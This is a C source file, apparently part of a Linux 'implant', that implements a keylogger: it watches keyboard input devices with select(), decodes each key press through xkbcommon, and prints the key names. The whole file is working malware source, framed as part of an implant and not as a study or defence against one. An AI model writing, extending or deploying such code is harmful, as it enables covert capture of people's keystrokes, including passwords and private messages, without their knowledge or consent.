
/*
   key-logging is done here......yeah
*/


#include "implant.h"
#include <alloca.h>
#include <bits/types/struct_timeval.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <sys/queue.h>
#include <sys/select.h>
#include <linux/input.h>
#include <sys/types.h>
#include <unistd.h>
#include <xkbcommon/xkbcommon.h>


static int get_highest_fd(implant_t *instance) {
    int highest_fd = -1;

    keyboard_t *it = NULL;
    TAILQ_FOREACH(it, &instance->kbd, devices) {
        highest_fd = (it->fd > highest_fd) ? it->fd : highest_fd;
    }
    return highest_fd;
}

static int log_keyboard(int fd, struct xkb_state *state) {
    struct input_event evt = {0};

    ssize_t bytes_read = read(fd, &evt, sizeof(evt));
    if (bytes_read != sizeof(evt)) {

#ifdef DEBUG
        DEBUG_LOG("[!] read() error: %s", strerror(errno));
#endif

        return ERROR;
    }

    // 1 = is_pressed
    if (evt.type == EV_KEY && evt.value == KEY_PRESSED) {
        char key_description[256] = {0};
        xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);

        xkb_keysym_get_name(keysym, key_description, 256);
        printf("[+] Key pressed: %s\n", key_description);
    }

    return SUCCESSFUL;
}


/*
    main loop to listen for keys and stuff
*/
void keylog(implant_t *instance) {


    /* first set up select etc */
    int highest_fd = get_highest_fd(instance);
    fd_set rd, err;
    int status = 0;

    if (highest_fd < 0) {

#ifdef DEBUG
        DEBUG_LOG("[!] no keyboard found. exiting");
#endif

        return;
    }


    /*
       initialize xkbcommon context

       this is the stuff that allows us to maps keys to
       the correct language & manages special characters, shift, etc.
    */

    struct xkb_context *context = NULL;
    struct xkb_keymap *keymap = NULL;
    struct xkb_state *state = NULL;

    context = xkb_context_new(0);
    if (!context) {

#ifdef DEBUG
        DEBUG_LOG("[!] error with xkb_context_new(): %s", strerror(errno));
#endif

        return;

    }

    keymap = xkb_keymap_new_from_names(context, NULL, 0);
    if (!keymap) {

#ifdef DEBUG
        DEBUG_LOG("[!] error with xkb_keymap_new_from_names(): %s", strerror(errno));
#endif

        goto LOG_FUNCTION_CLEANUP;
    }

    state = xkb_state_new(keymap);
    if (!state) {

#ifdef DEBUG
        DEBUG_LOG("[!] error with xkb_state_new(): %s", strerror(errno));
#endif

        goto LOG_FUNCTION_CLEANUP;
    }


    /* run the damn loop */
    while (1312) {

        /* setup FD-sets */
        keyboard_t *it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            FD_SET(it->fd, &rd);
            FD_SET(it->fd, &err);
        }

        /* check if a key has been pressed */
        status = select(highest_fd + 1, &rd, NULL, &err, (instance->debug_enabled) ? &(struct timeval){1, 0}: NULL);
        if (status < 0) {

#ifdef DEBUG
            DEBUG_LOG("[!] select error: %s", strerror(errno));
#endif

            goto LOG_FUNCTION_CLEANUP;
        }

        /* check file descriptors (first for error, then for new input) */
        it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            if (FD_ISSET(it->fd, &err)) {

#ifdef DEBUG
                DEBUG_LOG("[!] Error on file descriptor %d", it->fd);
#endif

                /* keyboard has been un-plugged, let's continue */
                close(it->fd);
                TAILQ_REMOVE(&instance->kbd, it, devices);

                /* TODO: there is probably a memory leak here, investigate how to fix */

                continue;
            }

            /* checking for new input here */
            if (FD_ISSET(it->fd, &rd)) {

                /*
                    should we really kill the run here or can we recover this ?
                    i need to run some tests before making a decision.
                */
                if (log_keyboard(it->fd, state) == ERROR)
                    goto LOG_FUNCTION_CLEANUP;
            }

        }

    }


LOG_FUNCTION_CLEANUP:
    if (state != NULL)
        xkb_state_unref(state);

    if (keymap != NULL)
        xkb_keymap_unref(keymap);

    if (context != NULL)
        xkb_context_unref(context);

}
